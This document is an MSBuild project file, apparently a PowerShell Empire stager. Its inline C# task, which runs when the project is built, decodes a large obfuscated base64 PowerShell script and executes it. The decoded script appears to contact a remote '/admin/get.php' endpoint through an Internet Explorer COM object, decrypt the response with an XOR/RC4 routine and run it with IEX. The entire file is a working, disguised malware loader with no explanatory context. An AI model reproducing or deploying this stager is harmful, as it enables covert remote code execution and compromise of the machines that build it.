<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target Name="EmpireStager"><ClassExample /></Target><UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" ><Task><Reference Include="System.Management.Automation" /><Using Namespace="System" /><Using Namespace="System.IO" /><Using Namespace="System.Reflection" /><Using Namespace="System.Collections.Generic" /><Code Type="Class" Language="cs"><![CDATA[ using System;using System.IO;using System.Diagnostics;using System.Reflection;using System.Runtime.InteropServices;using System.Collections.ObjectModel;using System.Management.Automation;using System.Management.Automation.Runspaces;using System.Text;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class ClassExample :  Task, ITask{public override bool Execute(){byte[] data = Convert.FromBase64String("IAAmACgAIgB7ADEAfQB7ADAAfQB7ADIAfQAiAC0AZgAgACcAVAAtACcALAAnAHMARQAnACwAJwBJAHQAZQBNACcAKQAgACgAIgB2AGEAIgArACIAUgBpAGEAIgArACIAQgBsAGUAOgBkADIAagAiACsAIgB3AFYAOAAiACkAIAAoACAAWwBUAHkAUABlAF0AKAAiAHsANQB9AHsANwB9AHsANgB9AHsAMQB9AHsAMgB9AHsAMwB9AHsANAB9AHsAMAB9AHsAOAB9ACIAIAAtAGYAJwBFAHAATwBpAE4AVABtAEEAbgBhAGcAJwAsACcAUwAnACwAJwBFACcALAAnAHIAJwAsACcAVgBpAEMAJwAsACcAUwB5ACcALAAnAE4AZQB0AC4AJwAsACcAUwB0AGUATQAuACcALAAnAGUAcgAnACkAIAAgACkAOwAgACAAIAAkAEMAUgA2ACAAIAA9ACAAIABbAHQAeQBQAGUAXQAoACIAewA0AH0AewAzAH0AewAyAH0AewAwAH0AewAxAH0AIgAgAC0ARgAgACcARQAnACwAJwBOAGMATwBEAEkAbgBHACcALAAnAG0ALgB0AGUAeABUAC4AJwAsACcAeQBTAHQAZQAnACwAJwBTACcAKQAgADsAIAAgACAAIAAkAEIAbQA5AHQAeQBIAD0AIAAgAFsAVABZAFAAZQBdACgAIgB7ADEAfQB7ADIAfQB7ADMAfQB7ADAAfQAiAC0AZgAgACcAZwAnACwAJwBUAEUAWAAnACwAJwBUAC4AJwAsACcARQBuAGMAbwBEAEkATgAnACkAOwAgAC4AKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAIAAnAFMAJwAsACcAZQB0ACcAKQAgACAAQgBwAHgAIAAoACAAIABbAFQAWQBQAEUAXQAoACIAewAxAH0AewAwAH0AewAyAH0AIgAgAC0AZgAnAFYAJwAsACcAYwBPAG4AJwAsACcAZQBSAHQAJwApACAAKQAgADsAIAAkAE8AMQBXADUAIAA9AFsAVAB5AHAARQBdACgAIgB7ADIAfQB7ADQAfQB7ADMAfQB7ADUAfQB7ADEAfQB7ADAAfQAiACAALQBGACcARwBTACcALAAnAGkAbgBnAEYAbABBACcALAAnAHMAWQBTAHQAJwAsACcAbQAuAFIARQBmAEwAJwAsACcARQAnACwAJwBFAGMAVABJAE8ATgAuAGIASQBOAEQAJwApACAAIAA7ACAAJABEAHkAQgAgACAAPQBbAHQAeQBQAEUAXQAoACIAewAwAH0AewAxAH0AewAzAH0AewAyAH0AIgAtAGYAJwBzAHkAUwB0AGUAJwAsACcATQAnACwAJwBUACcALAAnAC4AQwBPAE4AdgBlAHIAJwApADsASQBmACgAJAB7AFAAcwB2AGAARQByAHMAYABJAG8AbgB0AGEAQgBMAGUAfQAuACIAcABzAFYAZQBSAGAAcwBgAEkAbwBOACIALgAiAE0AQQBgAGoATwBSACIAIAAtAGcAZQAgADMAKQB7AH0AOwAgACgALgAoACIAewAwAH0AewAxAH0AewAyAH0AIgAtAGYAIAAnAEcARQBUAC0AdgAnACwAJwBBAFIAJwAsACcAaQBBAEIATABFACcAKQAgACAAKAAiAEQAMgBqACIAKwAiAFcAVgA4ACIAKQAgAC0AVgBhAEwAKQA6ADoAIgBlAFgAUABlAGAAYwBUADEAMAAwAGMAYABvAG4AVABpAG4AdQBFACIAPQAwADsAJAB7AEsAfQA9ACAAIAAkAEMAUgA2ADoAOgAiAEEAcwBgAEMAaQBJACIALgAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAnAEIAeQB0AGUAcwAnACwAJwBHAGUAdAAnACkALgBJAG4AdgBvAGsAZQAoACgAKAAoACIAewA2AH0AewA3AH0AewAxAH0AewAzAH0AewA1AH0AewAwAH0AewAyAH0AewA4AH0AewA0AH0AIgAtAGYAIAAnAD0ALQAnACwAJwBuACcALAAnAEIAJgBpAHQAUwBEAGMAOgB2AGoAJwAsACcAMQAoAE0AKwBVADIAJwAsACcALAA8ADYAJwAsACcAeAAuAG8AZQAnACwAJwBQAF0AQwBMACcALAAnAE8AOABTACcALAAnAD8AJwApACkALgAiAHIARQBQAEwAYQBgAGMARQAiACgAJwBpAHQAUwAnACwAWwBzAHQAUgBpAE4AZwBdAFsAYwBIAGEAUgBdADEAMgA0ACkAKQApADsAJAB7AFIAfQA9AHsAJAB7AGQAfQAsACQAewBrAH0APQAkAHsAQQBSAGAAZwBzAH0AOwAkAHsAcwB9AD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8AC4AKAAnACUAJwApAHsAJAB7AEoAfQA9ACgAJAB7AGoAfQArACQAewBzAH0AWwAkAHsAXwB9AF0AKwAkAHsASwB9AFsAJAB7AF8AfQAlACQAewBrAH0ALgAiAEMAYABPAFUATgBUACIAXQApACUAMgA1ADYAOwAkAHsAcwB9AFsAJAB7AF8AfQBdACwAJAB7AFMAfQBbACQAewBKAH0AXQA9ACQAewBTAH0AWwAkAHsASgB9AF0ALAAkAHsAUwB9AFsAJAB7AF8AfQBdAH0AOwAkAHsARAB9AHwALgAoACcAJQAnACkAewAkAHsASQB9AD0AKAAkAHsAaQB9ACsAMQApACUAMgA1ADYAOwAkAHsAaAB9AD0AKAAkAHsASAB9ACsAJAB7AFMAfQBbACQAewBpAH0AXQApACUAMgA1ADYAOwAkAHsAcwB9AFsAJAB7AGkAfQBdACwAJAB7AFMAfQBbACQAewBoAH0AXQA9ACQAewBzAH0AWwAkAHsASAB9AF0ALAAkAHsAUwB9AFsAJAB7AEkAfQBdADsAJAB7AF8AfQAtAGIAeABvAHIAJAB7AFMAfQBbACgAJAB7AHMAfQBbACQAewBpAH0AXQArACQAewBzAH0AWwAkAHsAaAB9AF0AKQAlADIANQA2AF0AfQB9ADsAJAB7AEkAYABlAH0APQAuACgAIgB7ADEAfQB7ADMAfQB7ADAAfQB7ADIAfQAiAC0AZgAgACcATwBiAGoAZQBjACcALAAnAE4AZQAnACwAJwB0ACcALAAnAHcALQAnACkAIAAtAEMATwBNACAAKAAiAHsANAB9AHsAMQB9AHsAMAB9AHsAMwB9AHsANQB9AHsAMgB9ACIALQBmACAAJwBuACcALAAnAGUAcgAnACwAJwBhAHQAaQBvAG4AJwAsACcAZQB0AEUAJwAsACcASQBuAHQAJwAsACcAeABwAGwAbwByAGUAcgAuAEEAcABwAGwAaQBjACcAKQA7ACQAewBpAGAARQB9AC4AIgBzAGkATABlAGAATgB0ACIAPQAkAHsAdABgAFIAdQBlAH0AOwAkAHsAaQBgAGUAfQAuACIAVgBJAHMASQBiAGAAbABFACIAPQAkAHsARgBhAGAAbABTAEUAfQA7ACQAewBmAGAAbAB9AD0AMQA0ADsAJAB7AHMAYABFAFIAfQA9ACQAKAAgACgALgAoACIAewAwAH0AewAxAH0AewAyAH0AIgAtAGYAIAAnAEcAJwAsACcARQBUAC0AVgBBAHIAJwAsACcAaQBBAGIATABFACcAKQAgACAAKAAnAGIATQA5ACcAKwAnAFQAJwArACcAWQBoACcAKQAgACAAKQAuAHYAQQBsAFUARQA6ADoAIgBVAGAATgBJAEMAbwBkAEUAIgAuACIAZwBFAHQAUwBUAFIAYABJAE4ARwAiACgAIAAoAC4AKAAiAHsAMAB9AHsAMQB9AHsAMgB9ACIALQBmACcAZwBlAHQALQBjAGgAaQAnACwAJwBMAGQAJwAsACcASQB0AGUATQAnACkAIAAgAHYAQQBSAEkAQQBiAGwARQA6AEIAUAB4ACAAKQAuAFYAYQBMAFUARQA6ADoAKAAiAHsAMwB9AHsAMQB9AHsAMAB9AHsAMgB9ACIAIAAtAGYAIAAnAGEAcwBlACcALAAnAG8AbQBCACcALAAnADYANABTAHQAcgBpAG4AZwAnACwAJwBGAHIAJwApAC4ASQBuAHYAbwBrAGUAKAAoACIAewAxADAAfQB7ADYAfQB7ADAAfQB7ADUAfQB7ADkAfQB7ADgAfQB7ADcAfQB7ADIAfQB7ADQAfQB7ADEAfQB7ADMAfQAiACAALQBmACcAQQBMAGcAQQB3AEEAQwA0ACcALAAnAEQAWQAnACwAJwA2ACcALAAnAEEAJwAsACcAQQBEAEUAQQBNAHcAQQB6AEEAJwAsACcAQQBNAGcAQQB1AEEAJwAsACcAQQBMAHcAQQB4AEEARABBACcALAAnAEEAJwAsACcAQQBOAFEAJwAsACcARABFACcALAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4ACcAKQApACkAKQA7ACQAewBUAH0APQAoACIAewAwAH0AewAyAH0AewAxAH0AewAzAH0AIgAgAC0AZgAgACcALwBhAGQAbQBpACcALAAnAHAAaAAnACwAJwBuAC8AZwBlAHQALgAnACwAJwBwACcAKQA7ACQAewBDAH0APQAoACgAKAAiAHsAOQB9AHsAMwB9AHsAMgB9AHsAOAB9AHsANAB9AHsANwB9AHsANgB9AHsANQB9AHsAMAB9AHsAMQB9ACIAIAAtAGYAJwBIACcALAAnAEMAMgBaADAARQA9AHsAMAB9ACcALAAnAFkAOgAgAGIAewAnACwAJwBGAC0AUgBBACcALAAnAG8ATwAnACwAJwArAGcARABWACcALAAnAHYAJwAsACcAeQBFAEIAcgBXADYAYgBQAEcAdwAnACwAJwAwAH0AKwBXAGwAdQAnACwAJwBDACcAKQApACAAIAAtAEYAIABbAEMAaABhAHIAXQAzADkAKQA7ACQAewBJAEUAfQAuACgAIgB7ADEAfQB7ADIAfQB7ADAAfQAiAC0AZgAnAHQAZQAyACcALAAnAG4AYQB2AGkAZwAnACwAJwBhACcAKQAuAEkAbgB2AG8AawBlACgAJAB7AFMAYABFAFIAfQArACQAewBUAH0ALAAkAHsAZgBMAH0ALAAwACwAJAB7AG4AYABVAEwAbAB9ACwAJAB7AGMAfQApADsAdwBoAGkAbABlACgAJAB7AGkAZQB9AC4AIgBCAHUAYABzAFkAIgApAHsAJgAoACIAewAzAH0AewAxAH0AewAwAH0AewAyAH0AIgAtAGYAJwBTAGwAJwAsACcAYQByAHQALQAnACwAJwBlAGUAcAAnACwAJwBTAHQAJwApACAALQBNAGkAbABsAGkAcwBlAGMAbwBuAGQAcwAgADEAMAAwAH0AOwAkAHsAaABgAFQAfQAgAD0AIAAkAHsASQBgAGUAfQAuACIAZABvAGMAYABVAGAATQBFAE4AdAAiAC4AKAAiAHsAMAB9AHsAMQB9AHsAMgB9ACIALQBmACAAJwBHACcALAAnAGUAJwAsACcAdABUAHkAcABlACcAKQAuAEkAbgB2AG8AawBlACgAKQAuACgAIgB7ADEAfQB7ADAAfQB7ADIAfQAiACAALQBmACAAJwBlACcALAAnAEkAbgB2AG8AawAnACwAJwBNAGUAbQBiAGUAcgAnACkALgBJAG4AdgBvAGsAZQAoACgAIgB7ADEAfQB7ADAAfQAiACAALQBmACcAZAB5ACcALAAnAGIAbwAnACkALAAgACAAIAAkAE8AMQB3ADUAOgA6ACIARwBFAHQAUAByAGAAbwBQAEUAYABSAFQAWQAiACwAIAAkAHsATgBgAFUATABsAH0ALAAgACQAewBpAGAAZQB9AC4AIgBEAG8AYwBVAE0AZQBgAE4AVAAiACwAIAAkAHsAbgBgAFUAbABMAH0AKQAuACIASQBgAE4AYABOAGUAUgBoAFQATQBMACIAOwB0AHIAeQAgAHsAJAB7AEQAYABBAFQAYQB9AD0AIAAoACAALgAoACIAewAxAH0AewAwAH0AewAyAH0AIgAtAGYAJwBBAGIAJwAsACcAVgBBAFIASQAnACwAJwBMAEUAJwApACAARAB5AGIAIAAgAC0AdgBhAGwAdQBFAG8AbgBMAHkAKQA6ADoAKAAiAHsAMAB9AHsAMgB9AHsAMQB9AHsAMwB9ACIALQBmACAAJwBGACcALAAnAFMAJwAsACcAcgBvAG0AQgBhAHMAZQA2ADQAJwAsACcAdAByAGkAbgBnACcAKQAuAEkAbgB2AG8AawBlACgAJAB7AEgAdAB9ACkAfQAgAGMAYQB0AGMAaAAgAHsAJAB7AE4AVQBgAEwATAB9AH0AJAB7AEkAYABWAH0APQAkAHsARABBAGAAVABhAH0AWwAwAC4ALgAzAF0AOwAkAHsAZABgAEEAdABhAH0APQAkAHsARABgAEEAVABhAH0AWwA0AC4ALgAkAHsAZABhAGAAVABhAH0ALgAiAGwAZQBuAGcAYABUAGgAIgBdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAHsAcgB9ACAAJAB7AGQAYABBAFQAQQB9ACAAKAAkAHsASQBgAFYAfQArACQAewBrAH0AKQApAHwAJgAoACIAewAwAH0AewAxAH0AIgAtAGYAJwBJACcALAAnAEUAWAAnACkA");string script = Encoding.Unicode.GetString(data);PSExecute(script);return true;}public static void PSExecute(string cmd){Runspace runspace = RunspaceFactory.CreateRunspace();runspace.Open();Pipeline pipeline = runspace.CreatePipeline();pipeline.Commands.AddScript(cmd);pipeline.InvokeAsync();}} ]]></Code></Task></UsingTask></Project>